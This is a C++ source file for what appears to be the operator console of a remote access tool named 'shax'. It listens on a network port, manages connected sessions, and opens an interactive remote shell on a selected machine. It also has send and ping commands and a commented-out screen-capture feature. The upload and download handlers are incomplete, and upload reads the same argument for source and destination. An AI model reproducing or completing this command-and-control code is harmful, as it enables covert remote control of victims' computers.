#include "c_shax.hpp"

class command {
public:
	command( shax* shx ) {
		m_shax = shx;
	}

	bool execute_cmd( std::string cmd ) {

		const auto prs = new parser( cmd );

#pragma region NEED_FIX
		//if ( prs->is_cmd( "screengrab" ) ) {
		//	if ( prs->has_flag( "-a" ) ) {
		//		if ( m_shax->snd_str( cmd.c_str() ) ) {
		//			size_t size;
		//			auto data = m_shax->rcv_arr<byte*>( &size );
		//			FILE* f;
		//			fopen_s( &f, "out.bmp", "wb+" );
		//			fwrite( data, sizeof( byte ), size, f );
		//			fclose( f );
		//			return true;
		//		}
		//	}
		//}
#pragma endregion

		if ( prs->is_cmd( "shell" ) ) {

			if ( !m_shax->snd_str( cmd.c_str() ) ) {
				m_shax->died(); 
				return false;
			}

			std::string answer;

			while ( true ) {
				while ( true ) {
					auto data = m_shax->rcv_str( false );

					if ( !data.second ) {
						m_shax->died();
						return false;
					}

					answer += data.first;

					if ( answer[answer.size() - 1] == '>' ) {
						answer.erase( 0, answer.find( "\n" ) );
						utils::print( answer, msg_color::cyan, msg_type::raw );
						answer.clear();
						break;
					}
				}

				auto cmd = utils::stdin_to_str();

				if ( !m_shax->snd_str( cmd.c_str(), false, false ) ) {
					m_shax->died();
					return false;
				}

				if ( !strcmp( "exit\n", cmd.c_str() ) ) {
					return true;
				}
			}
		}

		if ( prs->is_cmd( "select" ) ) {
			if ( prs->has_argument( "-i" ) ) {
				auto& session_index = prs->get_argument( "-i" );
				if ( m_shax->select_session( stoi( session_index ) ) ) {
					utils::println(
						std::string( "Session " + session_index + " is now active" ),
						msg_color::light_green, msg_type::success );
					return true;
				}
				m_shax->died();
			}
			return false;
		}

		if ( prs->is_cmd( "send" ) ) {
			if ( prs->has_argument( "-m" ) ) {
				if ( m_shax->snd_str( cmd.c_str() ) ) {
					utils::println(
						std::string( "Success sending " + prs->get_argument( "-m" ) ),
						msg_color::light_green, msg_type::success );
					return true;
				}			
				m_shax->died();
			}
			return false;
		}

		if ( prs->is_cmd( "upload" ) ) {
			if ( prs->arg_count() == 1 ) {
				auto from = prs->get_argument( 1 );
				auto to   = prs->get_argument( 1 );

				// .............
			}
		}

		if ( prs->is_cmd( "download" ) ) {
			
		}

		if ( prs->is_cmd( "ping" ) ) {

			auto ping = m_shax->ping();

			if ( ping ) {
				utils::println(
					std::string( " ping --> " + std::to_string( ping ) + " ms --> pong" ),
					msg_color::light_green, msg_type::success );
				return true;
			}
			m_shax->died();
		}

		return false;
	}

	shax* m_shax;
};

int main( void ) {

	if ( !SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), msg_color::light_white ) )
		return -1;

	auto shx = new shax();
	auto cmd = new command( shx );
	std::thread async_listener( &shax::start_listener, shx, NET_PORT );

	while ( true ) {
		std::cout << "shax>";
		std::string str_cmd;
		std::getline( std::cin, str_cmd );
		cmd->execute_cmd( str_cmd );
	}

	async_listener.join();
	return 0;
}